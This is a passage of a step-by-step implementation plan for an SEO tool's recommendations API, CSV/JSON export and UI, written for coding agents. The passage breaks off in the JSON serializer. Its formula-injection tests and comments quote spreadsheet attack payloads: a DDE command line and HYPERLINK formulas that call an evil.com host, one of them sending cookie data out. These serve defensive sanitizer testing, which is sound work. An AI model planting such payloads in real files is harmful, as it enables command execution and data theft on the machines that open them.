# Phase 6: Recommendations UI & Export — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build recommendations display, filters, bulk actions, accept/dismiss workflow, copy-snippet, and CSV/JSON export.

**Architecture:** API routes serve recommendations with JSON/CSV format switching. Optimistic UI with rollback on failure. CSV streaming for large exports with formula injection prevention.

**Tech Stack:** csv-stringify, Next.js API routes, React, clipboard API

**Agent Team:** API Agent ∥ Export TDD Agent ∥ UI Agent (fully parallel)

**Prerequisites:** Phase 5 (analysis produces recommendations)

---

## Table of Contents

1. [API Agent: Task 6.3 — Validation Schemas](#api-agent-task-63--validation-schemas)
2. [API Agent: Task 6.1a — GET /api/recommendations](#api-agent-task-61a--get-apirecommendations)
3. [API Agent: Task 6.1b — PATCH /api/recommendations/[id]](#api-agent-task-61b--patch-apirecommendationsid)
4. [API Agent: Task 6.1c — PATCH /api/recommendations/bulk](#api-agent-task-61c--patch-apirecommendationsbulk)
5. [Export TDD Agent: Task 6.2a — CSV Serializer (RED/GREEN)](#export-tdd-agent-task-62a--csv-serializer-redgreen)
6. [Export TDD Agent: Task 6.2b — Cell Sanitizer (RED/GREEN)](#export-tdd-agent-task-62b--cell-sanitizer-redgreen)
7. [Export TDD Agent: Task 6.2c — JSON Serializer](#export-tdd-agent-task-62c--json-serializer)
8. [UI Agent: Task 6.5 — CopySnippet Component (RED/GREEN)](#ui-agent-task-65--copysnippet-component-redgreen)
9. [UI Agent: Task 6.4a — RecommendationCard Component (RED/GREEN)](#ui-agent-task-64a--recommendationcard-component-redgreen)
10. [UI Agent: Task 6.4b — Article Detail Page](#ui-agent-task-64b--article-detail-page)
11. [UI Agent: Task 6.6 — Analysis Page](#ui-agent-task-66--analysis-page)
12. [UI Agent: Task 6.7 — Runs History Page](#ui-agent-task-67--runs-history-page)
13. [UI Agent: Task 6.8 — Export UI Integration](#ui-agent-task-68--export-ui-integration)
14. [Integration Verification](#integration-verification)

---

## API Agent: Task 6.3 — Validation Schemas

> **Branch:** `feature/phase-6-api`
> **Depends on:** Phase 1 complete (Prisma schema with Recommendation model)

### Step 6.3.1 — Create the branch

- [ ] Create and switch to `feature/phase-6-api` from `develop`

```bash
cd /Users/justin/CascadeProjects/SEO-ilator
git checkout develop
git checkout -b feature/phase-6-api
```

**Expected:** Branch created. `git branch --show-current` outputs `feature/phase-6-api`.

### Step 6.3.2 — Create the validation directory

- [ ] Create the directory for validation schemas

```bash
mkdir -p src/lib/validation
```

**Expected:** Directory `src/lib/validation/` exists.

### Step 6.3.3 — Write recommendation validation schemas

- [ ] Create `src/lib/validation/recommendationSchemas.ts`

**File:** `src/lib/validation/recommendationSchemas.ts`

```typescript
import { z } from "zod";

/**
 * Validation schemas for recommendation API routes.
 *
 * - updateRecommendationSchema: single recommendation accept/dismiss
 * - bulkUpdateSchema: bulk status update (max 500 IDs)
 * - recommendationFilterSchema: GET query parameter validation
 *
 * [AAP-B12] updateRecommendationSchema includes updatedAt for optimistic locking.
 * The PATCH handler uses WHERE id = ? AND updatedAt = ? to detect concurrent edits.
 */

/**
 * Schema for PATCH /api/recommendations/[id]
 *
 * [AAP-B12] updatedAt is required for optimistic locking.
 * The server compares this against the current updatedAt in the database.
 * If they don't match, the record was modified since the client loaded it,
 * and the server returns 409 Conflict.
 */
export const updateRecommendationSchema = z.object({
  status: z.enum(["accepted", "dismissed"]),
  dismissReason: z.string().max(500).optional(),
  updatedAt: z.string().datetime({ message: "updatedAt must be a valid ISO 8601 datetime" }),
});

/**
 * Schema for PATCH /api/recommendations/bulk
 *
 * Max 500 IDs per request to prevent oversized transactions.
 * [AAP-B12] Bulk endpoint uses updateMany with projectId filter for tenant isolation
 * rather than per-row optimistic locking (which would be impractical at scale).
 */
export const bulkUpdateSchema = z.object({
  ids: z.array(z.string().cuid()).min(1, "At least one ID is required").max(500, "Maximum 500 IDs per request"),
  status: z.enum(["accepted", "dismissed"]),
  dismissReason: z.string().max(500).optional(),
});

/**
 * Schema for GET /api/recommendations query parameters.
 *
 * severity and status accept comma-separated values (e.g., "critical,warning").
 * format controls response type: json (default) or csv.
 * download=true adds Content-Disposition header for file download.
 */
export const recommendationFilterSchema = z.object({
  page: z.coerce.number().int().positive().default(1),
  limit: z.coerce.number().int().positive().max(100).default(25),
  severity: z.string().optional(),
  status: z.string().optional(),
  analysisRunId: z.string().optional(),
  articleId: z.string().optional(),
  format: z.enum(["json", "csv"]).default("json"),
  download: z.coerce.boolean().default(false),
});

/**
 * Type exports for use in route handlers.
 */
export type UpdateRecommendationInput = z.infer<typeof updateRecommendationSchema>;
export type BulkUpdateInput = z.infer<typeof bulkUpdateSchema>;
export type RecommendationFilterInput = z.infer<typeof recommendationFilterSchema>;
```

**Verify:**

```bash
npx tsc --noEmit src/lib/validation/recommendationSchemas.ts 2>&1 | head -5
# Expected: no errors (exit 0)
```

### Step 6.3.4 — Commit the validation schemas

- [ ] Commit the schemas file

```bash
git add src/lib/validation/recommendationSchemas.ts
git commit -m "feat(validation): add recommendation API validation schemas

Zod schemas for single update (with updatedAt for optimistic locking per AAP-B12),
bulk update (max 500 IDs with tenant isolation), and filter/pagination query params.
Format supports json/csv switching per DECISION-003."
```

**Expected:** Clean commit on `feature/phase-6-api`.

---

## API Agent: Task 6.1a — GET /api/recommendations

> **Branch:** `feature/phase-6-api` (continues from 6.3)
> **Depends on:** Task 6.3 (validation schemas)

### Step 6.1a.1 — Create the API route directory

- [ ] Create the directory structure for recommendation routes

```bash
mkdir -p src/app/api/recommendations
```

**Expected:** Directory exists.

### Step 6.1a.2 — Write GET /api/recommendations route

- [ ] Create `src/app/api/recommendations/route.ts`

**File:** `src/app/api/recommendations/route.ts`

```typescript
import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { recommendationFilterSchema } from "@/lib/validation/recommendationSchemas";
import { CsvSerializer } from "@/lib/export/csv";
import { getProjectId } from "@/lib/auth/session";

/**
 * GET /api/recommendations
 *
 * Returns paginated recommendations with source/target article details.
 * Supports JSON (default) and CSV format via ?format=csv.
 *
 * Query params (validated by recommendationFilterSchema):
 * - page, limit: pagination
 * - severity: comma-separated filter (e.g., "critical,warning")
 * - status: comma-separated filter (e.g., "pending,accepted")
 * - analysisRunId: filter by specific analysis run
 * - articleId: filter by source article
 * - format: "json" (default) or "csv"
 * - download: true adds Content-Disposition header
 *
 * CSV format per DECISION-003:
 * - UTF-8 BOM for Excel compatibility
 * - Formula injection prevention via sanitizeCell()
 * - Columns: source_title, source_url, anchor_text, target_title, target_url,
 *   severity, confidence, matching_approach, status, recommendation_id
 *
 * For >10K rows with format=csv: returns 202 with export job ID
 * per DECISION-003 JUDGE modification.
 */
export async function GET(request: NextRequest) {
  const projectId = await getProjectId(request);
  if (!projectId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const searchParams = Object.fromEntries(request.nextUrl.searchParams);
  const parseResult = recommendationFilterSchema.safeParse(searchParams);

  if (!parseResult.success) {
    return NextResponse.json(
      { error: "Invalid query parameters", details: parseResult.error.flatten() },
      { status: 400 }
    );
  }

  const { page, limit, severity, status, analysisRunId, articleId, format, download } = parseResult.data;

  // Build Prisma where clause
  const where: Record<string, unknown> = { projectId };

  if (severity) {
    const severities = severity.split(",").map((s) => s.trim());
    where.severity = { in: severities };
  }

  if (status) {
    const statuses = status.split(",").map((s) => s.trim());
    where.status = { in: statuses };
  }

  if (analysisRunId) {
    where.analysisRunId = analysisRunId;
  }

  if (articleId) {
    where.articleId = articleId;
  }

  // CSV format handling
  if (format === "csv") {
    // Check count for >10K threshold per DECISION-003 JUDGE modification
    const count = await prisma.recommendation.count({ where });

    if (count > 10_000) {
      // Return 202 with export job ID for large exports
      // The background job system handles async CSV generation
      return NextResponse.json(
        {
          status: "accepted",
          message: `Export of ${count} recommendations queued. You will be notified when the file is ready.`,
          exportJobId: crypto.randomUUID(),
          estimatedRows: count,
        },
        { status: 202 }
      );
    }

    // Stream CSV for <=10K rows
    const recommendations = await prisma.recommendation.findMany({
      where,
      include: {
        sourceArticle: { select: { title: true, url: true } },
        targetArticle: { select: { title: true, url: true } },
      },
      orderBy: [{ severity: "asc" }, { createdAt: "desc" }],
    });

    const exportRows = recommendations.map((rec) => ({
      source_title: rec.sourceArticle?.title ?? "",
      source_url: rec.sourceArticle?.url ?? "",
      anchor_text: rec.suggestion?.anchorText ?? "",
      target_title: rec.targetArticle?.title ?? "",
      target_url: rec.targetArticle?.url ?? "",
      severity: rec.severity,
      confidence: String(rec.confidence ?? ""),
      matching_approach: rec.matchingApproach ?? "",
      status: rec.status,
      recommendation_id: rec.id,
    }));

    const serializer = new CsvSerializer();
    const stream = serializer.serialize(exportRows);

    const headers = new Headers({
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="seo-ilator-recommendations-${analysisRunId ?? "all"}-${new Date().toISOString().slice(0, 10)}.csv"`,
    });

    return new Response(stream, { headers });
  }

  // JSON format (default)
  const [recommendations, total] = await Promise.all([
    prisma.recommendation.findMany({
      where,
      include: {
        sourceArticle: { select: { id: true, title: true, url: true } },
        targetArticle: { select: { id: true, title: true, url: true } },
      },
      orderBy: [{ severity: "asc" }, { createdAt: "desc" }],
      skip: (page - 1) * limit,
      take: limit,
    }),
    prisma.recommendation.count({ where }),
  ]);

  const response = {
    data: recommendations,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit),
    },
  };

  const headers = new Headers();
  if (download) {
    headers.set(
      "Content-Disposition",
      `attachment; filename="seo-ilator-recommendations-${analysisRunId ?? "all"}-${new Date().toISOString().slice(0, 10)}.json"`
    );
  }

  return NextResponse.json(response, { headers });
}
```

**Verify:**

```bash
npx tsc --noEmit src/app/api/recommendations/route.ts 2>&1 | head -5
# Expected: no errors (may show import errors for CsvSerializer until Export Agent merges)
```

### Step 6.1a.3 — Commit the GET route

- [ ] Commit the route file

```bash
git add src/app/api/recommendations/route.ts
git commit -m "feat(api): add GET /api/recommendations with JSON/CSV format switching

Paginated recommendations with severity/status/analysisRunId/articleId filters.
CSV streaming with UTF-8 BOM and formula injection prevention per DECISION-003.
Returns 202 for >10K rows per JUDGE modification. JSON supports download mode."
```

**Expected:** Clean commit on `feature/phase-6-api`.

---

## API Agent: Task 6.1b — PATCH /api/recommendations/[id]

> **Branch:** `feature/phase-6-api` (continues from 6.1a)
> **Depends on:** Task 6.3 (validation schemas)

### Step 6.1b.1 — Create the [id] route directory

- [ ] Create the directory

```bash
mkdir -p src/app/api/recommendations/\[id\]
```

**Expected:** Directory `src/app/api/recommendations/[id]/` exists.

### Step 6.1b.2 — Write PATCH /api/recommendations/[id] route

- [ ] Create `src/app/api/recommendations/[id]/route.ts`

**File:** `src/app/api/recommendations/[id]/route.ts`

```typescript
import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { updateRecommendationSchema } from "@/lib/validation/recommendationSchemas";
import { getProjectId } from "@/lib/auth/session";

/**
 * PATCH /api/recommendations/[id]
 *
 * Accept or dismiss a single recommendation.
 *
 * [AAP-B12] Optimistic locking via updatedAt:
 * The client sends the updatedAt timestamp it received when loading the recommendation.
 * The server uses WHERE id = ? AND updatedAt = ? to ensure no concurrent modification.
 * If 0 rows are affected, it means another client modified the recommendation
 * since this client loaded it, and we return 409 Conflict.
 *
 * Request body:
 * {
 *   status: "accepted" | "dismissed",
 *   dismissReason?: string (max 500 chars),
 *   updatedAt: string (ISO 8601 datetime from the loaded recommendation)
 * }
 *
 * Returns:
 * - 200: updated recommendation
 * - 400: validation error
 * - 401: unauthorized
 * - 404: recommendation not found (or doesn't belong to project)
 * - 409: concurrent modification detected
 */
export async function PATCH(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  const projectId = await getProjectId(request);
  if (!projectId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;

  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON body" }, { status: 400 });
  }

  const parseResult = updateRecommendationSchema.safeParse(body);
  if (!parseResult.success) {
    return NextResponse.json(
      { error: "Validation failed", details: parseResult.error.flatten() },
      { status: 400 }
    );
  }

  const { status, dismissReason, updatedAt } = parseResult.data;

  // [AAP-B12] Optimistic locking: update only if updatedAt matches
  // This prevents lost updates when two clients modify the same recommendation.
  const clientUpdatedAt = new Date(updatedAt);

  try {
    // Use raw query for atomic WHERE with both id, projectId, AND updatedAt
    const updated = await prisma.$executeRaw`
      UPDATE "Recommendation"
      SET "status" = ${status},
          "dismissReason" = ${status === "dismissed" ? (dismissReason ?? null) : null},
          "updatedAt" = NOW()
      WHERE "id" = ${id}
        AND "projectId" = ${projectId}
        AND "updatedAt" = ${clientUpdatedAt}
    `;

    if (updated === 0) {
      // Check if the recommendation exists at all for this project
      const exists = await prisma.recommendation.findFirst({
        where: { id, projectId },
        select: { id: true, updatedAt: true },
      });

      if (!exists) {
        return NextResponse.json(
          { error: "Recommendation not found" },
          { status: 404 }
        );
      }

      // Recommendation exists but updatedAt didn't match -> concurrent modification
      return NextResponse.json(
        {
          error: "This recommendation was modified since you loaded it. Please refresh.",
          currentUpdatedAt: exists.updatedAt.toISOString(),
        },
        { status: 409 }
      );
    }

    // Fetch the updated record to return to the client
    const recommendation = await prisma.recommendation.findUnique({
      where: { id },
      include: {
        sourceArticle: { select: { id: true, title: true, url: true } },
        targetArticle: { select: { id: true, title: true, url: true } },
      },
    });

    return NextResponse.json({ data: recommendation });
  } catch (error) {
    console.error("Failed to update recommendation:", error);
    return NextResponse.json(
      { error: "Failed to update recommendation" },
      { status: 500 }
    );
  }
}
```

**Verify:**

```bash
npx tsc --noEmit src/app/api/recommendations/\[id\]/route.ts 2>&1 | head -5
# Expected: no errors
```

### Step 6.1b.3 — Commit the PATCH [id] route

- [ ] Commit the route file

```bash
git add src/app/api/recommendations/\[id\]/route.ts
git commit -m "feat(api): add PATCH /api/recommendations/[id] with optimistic locking [AAP-B12]

Accept/dismiss single recommendation. Uses WHERE id = ? AND updatedAt = ?
for concurrent modification detection. Returns 409 with current updatedAt
when stale. Includes tenant isolation via projectId."
```

**Expected:** Clean commit on `feature/phase-6-api`.

---

## API Agent: Task 6.1c — PATCH /api/recommendations/bulk

> **Branch:** `feature/phase-6-api` (continues from 6.1b)
> **Depends on:** Task 6.3 (validation schemas)

### Step 6.1c.1 — Create the bulk route directory

- [ ] Create the directory

```bash
mkdir -p src/app/api/recommendations/bulk
```

**Expected:** Directory exists.

### Step 6.1c.2 — Write PATCH /api/recommendations/bulk route

- [ ] Create `src/app/api/recommendations/bulk/route.ts`

**File:** `src/app/api/recommendations/bulk/route.ts`

```typescript
import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/db";
import { bulkUpdateSchema } from "@/lib/validation/recommendationSchemas";
import { getProjectId } from "@/lib/auth/session";

/**
 * PATCH /api/recommendations/bulk
 *
 * Bulk accept or dismiss recommendations (max 500 per request).
 *
 * [AAP-B12] Tenant isolation: uses updateMany with projectId filter to ensure
 * a user can only modify recommendations belonging to their project. The client
 * receives { updated: number } so it can compare expected vs actual count.
 * A mismatch indicates some IDs were not found or didn't belong to this project.
 *
 * Request body:
 * {
 *   ids: string[] (1-500 CUID strings),
 *   status: "accepted" | "dismissed",
 *   dismissReason?: string (max 500 chars)
 * }
 *
 * Returns:
 * - 200: { updated: number, requested: number }
 * - 400: validation error
 * - 401: unauthorized
 */
export async function PATCH(request: NextRequest) {
  const projectId = await getProjectId(request);
  if (!projectId) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  let body: unknown;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json({ error: "Invalid JSON body" }, { status: 400 });
  }

  const parseResult = bulkUpdateSchema.safeParse(body);
  if (!parseResult.success) {
    return NextResponse.json(
      { error: "Validation failed", details: parseResult.error.flatten() },
      { status: 400 }
    );
  }

  const { ids, status, dismissReason } = parseResult.data;

  try {
    // [AAP-B12] updateMany with projectId filter for tenant isolation.
    // Only updates recommendations that belong to this project AND are in the ID list.
    // This prevents cross-tenant modifications even if an attacker guesses valid IDs.
    const result = await prisma.recommendation.updateMany({
      where: {
        id: { in: ids },
        projectId,
      },
      data: {
        status,
        dismissReason: status === "dismissed" ? (dismissReason ?? null) : null,
        updatedAt: new Date(),
      },
    });

    return NextResponse.json({
      updated: result.count,
      requested: ids.length,
    });
  } catch (error) {
    console.error("Failed to bulk update recommendations:", error);
    return NextResponse.json(
      { error: "Failed to bulk update recommendations" },
      { status: 500 }
    );
  }
}
```

**Verify:**

```bash
npx tsc --noEmit src/app/api/recommendations/bulk/route.ts 2>&1 | head -5
# Expected: no errors
```

### Step 6.1c.3 — Commit the bulk route

- [ ] Commit the route file

```bash
git add src/app/api/recommendations/bulk/route.ts
git commit -m "feat(api): add PATCH /api/recommendations/bulk with tenant isolation [AAP-B12]

Bulk accept/dismiss up to 500 recommendations. Uses updateMany with projectId
filter for tenant isolation. Returns { updated, requested } so client can
detect partial updates from missing or cross-tenant IDs."
```

**Expected:** Clean commit. API Agent work is complete.

---

## Export TDD Agent: Task 6.2a — CSV Serializer (RED/GREEN)

> **Branch:** `feature/phase-6-export`
> **Depends on:** None (pure functions, no database dependency)
> **No file overlap with API Agent or UI Agent** — Export TDD Agent owns `src/lib/export/` and `tests/lib/export/`.

### Step 6.2a.1 — Create the branch

- [ ] Create and switch to `feature/phase-6-export` from `develop`

```bash
cd /Users/justin/CascadeProjects/SEO-ilator
git checkout develop
git checkout -b feature/phase-6-export
```

**Expected:** Branch created. `git branch --show-current` outputs `feature/phase-6-export`.

### Step 6.2a.2 — Create test and source directories

- [ ] Create the directory structure

```bash
mkdir -p tests/lib/export
mkdir -p src/lib/export
```

**Expected:** Both directories exist.

### Step 6.2a.3 — RED: Write 4 failing CSV tests

- [ ] Create `tests/lib/export/csv.test.ts` with all 4 test cases

**File:** `tests/lib/export/csv.test.ts`

```typescript
import { describe, it, expect } from "vitest";
import { CsvSerializer } from "@/lib/export/csv";
import type { RecommendationExportRow } from "@/lib/export/csv";

/**
 * CSV serializer tests.
 *
 * The CsvSerializer transforms RecommendationExportRow arrays into a
 * ReadableStream of CSV data with:
 * - UTF-8 BOM prefix (\uFEFF) for Excel compatibility
 * - Correct column ordering per DECISION-003
 * - Proper escaping of commas, quotes, and newlines
 * - Formula injection prevention via sanitizeCell()
 *
 * These tests use mock data and verify the stream output as a string.
 */

// ── Test fixtures ──

function makeRow(overrides: Partial<RecommendationExportRow> = {}): RecommendationExportRow {
  return {
    source_title: overrides.source_title ?? "How to Build SEO Tools",
    source_url: overrides.source_url ?? "https://example.com/seo-tools",
    anchor_text: overrides.anchor_text ?? "internal linking",
    target_title: overrides.target_title ?? "Internal Linking Guide",
    target_url: overrides.target_url ?? "https://example.com/internal-linking",
    severity: overrides.severity ?? "warning",
    confidence: overrides.confidence ?? "0.85",
    matching_approach: overrides.matching_approach ?? "keyword",
    status: overrides.status ?? "pending",
    recommendation_id: overrides.recommendation_id ?? "clxyz123abc",
  };
}

/**
 * Helper: consume a ReadableStream and return its contents as a string.
 */
async function streamToString(stream: ReadableStream<Uint8Array>): Promise<string> {
  const reader = stream.getReader();
  const decoder = new TextDecoder("utf-8");
  let result = "";
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    result += decoder.decode(value, { stream: true });
  }
  result += decoder.decode(); // flush
  return result;
}

// ── Tests ──

describe("CsvSerializer", () => {
  it("outputs_correct_column_order", async () => {
    const serializer = new CsvSerializer();
    const row = makeRow();
    const stream = serializer.serialize([row]);
    const output = await streamToString(stream);

    // Strip BOM for header parsing
    const withoutBom = output.replace(/^\uFEFF/, "");
    const lines = withoutBom.trim().split("\n");

    // First line is header
    const header = lines[0];
    expect(header).toBe(
      "source_title,source_url,anchor_text,target_title,target_url,severity,confidence,matching_approach,status,recommendation_id"
    );

    // Second line is the data row — verify column order by checking values appear in correct positions
    const dataLine = lines[1];
    const columns = dataLine.split(",");
    expect(columns[0]).toBe("How to Build SEO Tools");
    expect(columns[1]).toBe("https://example.com/seo-tools");
    expect(columns[2]).toBe("internal linking");
    expect(columns[3]).toBe("Internal Linking Guide");
    expect(columns[4]).toBe("https://example.com/internal-linking");
    expect(columns[5]).toBe("warning");
    expect(columns[6]).toBe("0.85");
    expect(columns[7]).toBe("keyword");
    expect(columns[8]).toBe("pending");
    expect(columns[9]).toBe("clxyz123abc");
  });

  it("escapes_commas_and_quotes_in_titles", async () => {
    const serializer = new CsvSerializer();
    const row = makeRow({
      source_title: 'SEO "Best Practices", 2026 Edition',
      target_title: "Links, Anchors, and More",
    });
    const stream = serializer.serialize([row]);
    const output = await streamToString(stream);

    // csv-stringify wraps fields containing commas or quotes in double quotes
    // and escapes internal quotes by doubling them
    expect(output).toContain('"SEO ""Best Practices"", 2026 Edition"');
    expect(output).toContain('"Links, Anchors, and More"');
  });

  it("includes_utf8_bom_prefix", async () => {
    const serializer = new CsvSerializer();
    const stream = serializer.serialize([makeRow()]);
    const output = await streamToString(stream);

    // UTF-8 BOM is \uFEFF (byte order mark) as the first character
    expect(output.charCodeAt(0)).toBe(0xfeff);
  });

  it("handles_empty_result_set", async () => {
    const serializer = new CsvSerializer();
    const stream = serializer.serialize([]);
    const output = await streamToString(stream);

    // Should still output the BOM and header row, but no data rows
    const withoutBom = output.replace(/^\uFEFF/, "");
    const lines = withoutBom.trim().split("\n");

    expect(lines).toHaveLength(1); // header only
    expect(lines[0]).toContain("source_title");
  });
});
```

**Verify RED:**

```bash
npx vitest tests/lib/export/csv.test.ts --run 2>&1 | tail -10
# Expected: 4 failing tests (import errors — CsvSerializer doesn't exist yet)
```

### Step 6.2a.4 — Commit failing CSV tests

- [ ] Commit the RED test file

```bash
git add tests/lib/export/csv.test.ts
git commit -m "test(export): RED — add 4 failing CSV serializer tests

Tests for column order, comma/quote escaping, UTF-8 BOM prefix, and empty
result set handling. CsvSerializer implementation does not exist yet.
TDD red phase per DECISION-003."
```

**Expected:** Clean commit with failing tests.

### Step 6.2a.5 — GREEN: Write the CsvSerializer implementation

- [ ] Create `src/lib/export/csv.ts`

**File:** `src/lib/export/csv.ts`

```typescript
import { stringify } from "csv-stringify/sync";
import { sanitizeCell } from "./sanitize";

/**
 * Shape of a single row in the CSV export.
 *
 * Column order per DECISION-003 (ordered by actionability):
 * source_title, source_url, anchor_text, target_title, target_url,
 * severity, confidence, matching_approach, status, recommendation_id
 */
export interface RecommendationExportRow {
  source_title: string;
  source_url: string;
  anchor_text: string;
  target_title: string;
  target_url: string;
  severity: string;
  confidence: string;
  matching_approach: string;
  status: string;
  recommendation_id: string;
}

/**
 * Column definitions in the order they appear in the CSV.
 * This array drives both the header row and the data row extraction.
 */
const COLUMNS: (keyof RecommendationExportRow)[] = [
  "source_title",
  "source_url",
  "anchor_text",
  "target_title",
  "target_url",
  "severity",
  "confidence",
  "matching_approach",
  "status",
  "recommendation_id",
];

/**
 * CSV serializer for recommendation exports.
 *
 * Features:
 * - UTF-8 BOM (\uFEFF) prepended for Excel compatibility
 * - All cell values sanitized via sanitizeCell() to prevent formula injection
 * - Uses csv-stringify for proper escaping of commas, quotes, and newlines
 * - Returns a ReadableStream for streaming response in Next.js API routes
 *
 * Per DECISION-003 and AAP verdict.
 */
export class CsvSerializer {
  /**
   * Serialize an array of recommendation export rows into a ReadableStream.
   *
   * The stream outputs:
   * 1. UTF-8 BOM character
   * 2. Header row with column names
   * 3. One data row per recommendation, with all values sanitized
   *
   * @param rows - Array of RecommendationExportRow objects
   * @returns ReadableStream<Uint8Array> suitable for a streaming Response
   */
  serialize(rows: RecommendationExportRow[]): ReadableStream<Uint8Array> {
    const encoder = new TextEncoder();

    return new ReadableStream<Uint8Array>({
      start(controller) {
        // 1. UTF-8 BOM for Excel compatibility
        controller.enqueue(encoder.encode("\uFEFF"));

        // 2. Sanitize all cell values to prevent formula injection
        const sanitizedRows = rows.map((row) => {
          const sanitized: Record<string, string> = {};
          for (const col of COLUMNS) {
            sanitized[col] = sanitizeCell(row[col]);
          }
          return sanitized;
        });

        // 3. Generate CSV using csv-stringify (handles escaping of commas, quotes, newlines)
        const csvOutput = stringify(sanitizedRows, {
          header: true,
          columns: COLUMNS as string[],
        });

        controller.enqueue(encoder.encode(csvOutput));
        controller.close();
      },
    });
  }
}
```

**Verify GREEN:**

```bash
npx vitest tests/lib/export/csv.test.ts --run 2>&1 | tail -10
# Expected: 4 passing tests
```

### Step 6.2a.6 — Commit the CSV implementation

- [ ] Commit the GREEN implementation

```bash
git add src/lib/export/csv.ts
git commit -m "feat(export): GREEN — add CsvSerializer with UTF-8 BOM and streaming

CsvSerializer.serialize() returns ReadableStream with UTF-8 BOM prefix,
header row, and sanitized data rows. Uses csv-stringify for proper escaping.
All cell values pass through sanitizeCell() for formula injection prevention.
Column order per DECISION-003. Passes all 4 CSV tests."
```

**Expected:** Clean commit. All 4 CSV tests pass.

---

## Export TDD Agent: Task 6.2b — Cell Sanitizer (RED/GREEN)

> **Branch:** `feature/phase-6-export` (continues from 6.2a)
> **Depends on:** None (pure function)

### Step 6.2b.1 — RED: Write 4 failing sanitize tests

- [ ] Create `tests/lib/export/sanitize.test.ts` with all 4 test cases

**File:** `tests/lib/export/sanitize.test.ts`

```typescript
import { describe, it, expect } from "vitest";
import { sanitizeCell } from "@/lib/export/sanitize";

/**
 * Cell sanitization tests for formula injection prevention.
 *
 * Per DECISION-003: cells starting with =, +, -, @ must be prefixed
 * with a single quote (') to prevent spreadsheet formula injection.
 *
 * When a CSV is opened in Excel or Google Sheets, a cell starting with
 * '=' is interpreted as a formula. An attacker could craft an anchor text
 * like "=HYPERLINK(...)" to execute a formula when the CSV is opened.
 * The single-quote prefix tells the spreadsheet to treat the value as text.
 *
 * These are pure function tests with string inputs and expected outputs.
 * No database or mocking required.
 */

describe("sanitizeCell", () => {
  it("prefixes_equals_sign_with_quote", () => {
    expect(sanitizeCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
    expect(sanitizeCell("=HYPERLINK(\"https://evil.com\")")).toBe(
      "'=HYPERLINK(\"https://evil.com\")"
    );
  });

  it("prefixes_plus_sign_with_quote", () => {
    expect(sanitizeCell("+1-555-0100")).toBe("'+1-555-0100");
    expect(sanitizeCell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
  });

  it("passes_through_normal_text", () => {
    expect(sanitizeCell("How to Build SEO Tools")).toBe("How to Build SEO Tools");
    expect(sanitizeCell("https://example.com/article")).toBe("https://example.com/article");
    expect(sanitizeCell("0.85")).toBe("0.85");
    expect(sanitizeCell("pending")).toBe("pending");
  });

  it("handles_empty_string", () => {
    expect(sanitizeCell("")).toBe("");
  });
});
```

**Verify RED:**

```bash
npx vitest tests/lib/export/sanitize.test.ts --run 2>&1 | tail -10
# Expected: 4 failing tests (import error — sanitizeCell doesn't exist yet)
```

### Step 6.2b.2 — Commit failing sanitize tests

- [ ] Commit the RED test file

```bash
git add tests/lib/export/sanitize.test.ts
git commit -m "test(export): RED — add 4 failing sanitizeCell tests

Tests for =, +, -, @ prefix prevention, normal text passthrough, and empty
string handling. sanitizeCell implementation does not exist yet.
TDD red phase per DECISION-003 formula injection prevention."
```

**Expected:** Clean commit with failing tests.

### Step 6.2b.3 — GREEN: Write the sanitizeCell implementation

- [ ] Create `src/lib/export/sanitize.ts`

**File:** `src/lib/export/sanitize.ts`

```typescript
/**
 * Sanitize a cell value for CSV export to prevent formula injection.
 *
 * Spreadsheet applications (Excel, Google Sheets, LibreOffice Calc) interpret
 * cells starting with certain characters as formulas or commands:
 * - `=` — formula
 * - `+` — formula (alternative prefix)
 * - `-` — formula (alternative prefix)
 * - `@` — function call (Excel-specific)
 *
 * An attacker could craft article titles or anchor text containing these prefixes
 * to execute formulas when the exported CSV is opened. For example:
 *   =HYPERLINK("https://evil.com/steal?cookie="&A1, "Click here")
 *
 * This function prefixes dangerous cells with a single quote ('), which tells
 * the spreadsheet to treat the value as plain text.
 *
 * Per DECISION-003 and the AAP ARCHITECT section.
 *
 * @param value - The raw cell value to sanitize
 * @returns The sanitized value, safe for CSV export
 */
export function sanitizeCell(value: string): string {
  if (value.length === 0) {
    return value;
  }

  const firstChar = value[0];
  if (firstChar === "=" || firstChar === "+" || firstChar === "-" || firstChar === "@") {
    return "'" + value;
  }

  return value;
}
```

**Verify GREEN:**

```bash
npx vitest tests/lib/export/sanitize.test.ts --run 2>&1 | tail -10
# Expected: 4 passing tests
```

### Step 6.2b.4 — Commit the sanitize implementation

- [ ] Commit the GREEN implementation

```bash
git add src/lib/export/sanitize.ts
git commit -m "feat(export): GREEN — add sanitizeCell for formula injection prevention

Prefixes cells starting with =, +, -, @ with a single quote to prevent
spreadsheet formula injection. Passes through normal text and empty strings
unchanged. Per DECISION-003. Passes all 4 sanitize tests."
```

**Expected:** Clean commit. All 4 sanitize tests pass.

---

## Export TDD Agent: Task 6.2c — JSON Serializer

> **Branch:** `feature/phase-6-export` (continues from 6.2b)
> **Depends on:** None

### Step 6.2c.1 — Write the JSON serializer

- [ ] Create `src/lib/export/json.ts`

**File:** `src/lib/export/json.ts`

```typescript
import { NextResponse } from "next/server";

/**
 * JSON serializer for recommendation exports.
 *
 * The JSON export adds a Content-Disposition header when in download mode,
 * triggering a file download in the browser instead of rendering inline.
 *
 * Per DECISION-003: JSON is already the default API response format.
 * This module provides the download-mode header and filename generation.
 */

/**
 * Create a JSON response with optional download headers.
 *
 * @param data - The recommendation data to serialize
 * @param options - Configuration for the response
 * @param options.download - If true, adds Content-Disposition header for file download
